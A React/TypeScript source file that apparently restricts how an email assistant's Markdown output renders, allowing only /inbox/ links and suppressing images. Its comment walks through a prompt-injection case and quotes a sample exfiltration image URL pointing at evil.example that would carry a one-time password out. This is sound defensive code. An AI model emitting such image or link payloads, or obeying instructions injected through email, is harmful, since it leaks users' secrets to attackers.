import type React from "react";

/**
 * How Dobbie's Markdown is allowed to render. The model's text is not trusted:
 * it is shaped by the mail it reads, and mail is written by strangers. Anything
 * the browser fetches or follows on its own is an exfiltration channel, so this
 * is an allowlist of what may become live, not a style sheet.
 *
 * LINKS — backstop for the "never emit a link" prompt rule (system-prompt.ts).
 * Only a relative /inbox/... path is ever rendered as a clickable href; anything
 * else keeps its visible text but loses the link entirely.
 *
 * IMAGES — never rendered. An image needs no click: the browser fetches it the
 * moment it renders, so `![](https://evil.example/?d=<your OTP>)` written by a
 * model that an injected email steered would leak whatever it put in the URL —
 * no tool call, so no approval card ever sees it. Dobbie has no legitimate
 * reason to show an image, so the element is not produced at all; its alt text
 * stays as plain text (React escapes it), so nothing the model said goes
 * missing from the answer.
 */
export const markdownComponents = {
  // `node` is react-markdown's syntax-tree node, passed to every custom
  // component; spread onto the <a> it rendered as node="[object Object]".
  a: ({ href, children, ...props }: React.AnchorHTMLAttributes<HTMLAnchorElement> & { node?: unknown }) => {
    if (typeof href === "string" && href.startsWith("/inbox/")) {
      const anchorProps = { ...props };
      delete anchorProps.node;
      return (
        <a href={href} {...anchorProps}>
          {children}
        </a>
      );
    }
    return <>{children}</>;
  },
  img: ({ alt }: React.ImgHTMLAttributes<HTMLImageElement>) => (alt ? <>{alt}</> : null),
};
